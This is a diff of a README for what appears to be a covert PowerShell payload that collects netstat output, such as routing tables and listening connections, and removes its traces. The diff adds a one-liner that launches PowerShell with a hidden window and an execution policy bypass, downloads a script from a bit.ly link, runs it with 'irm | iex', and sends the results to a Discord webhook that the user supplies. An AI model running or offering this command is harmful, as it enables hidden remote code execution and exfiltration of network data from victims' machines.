@@ -32,17 +32,17 @@ Then it cleans up traces of what you have done after.
 Put 1 on the function that you want to active, else 0.
 Functions available:
 - default (*or simple 'netstat' command*)
-- routing_table **-r**
-- listening_canonical **-af**
-- listening_numerical **-an**
-- all_canonical **-qf**
-- all_numerical **-qn**
-- offload **-t**
-- proto **-ps "\<protocol>"**
+- routing_table **$r**
+- listening_canonical **$lc**
+- listening_numerical **$ln**
+- all_canonical **$ac**
+- all_numerical **$an**
+- offload **ot**
+- proto **$p "\<protocol>"**
     - *In this option you must put the protocol that you want to monitor, for example $proto="TCP" if you want to monitor TCP, else leave blank, so $proto="".*
 
-```
-powershell -w h -ep bypass $discord='' $default=1 $routing_table=1 $listening_canonical=1 $listening_numerical=1 $all_canonical=1 $all_numerical=1 $offload=1 $proto="TCP";irm TODO | iex
+```powershell
+powershell -w h -ep bypass $discord='';$d='1';$r='1';$lc='1';$ln='1';$ac='1';$an='1';$o='1';$p="TCP";irm bit.ly/Windows-netstat | iex;
 ```
 
 You must put your Discord webhook into the variable $discord='\<your-webhook-here>'
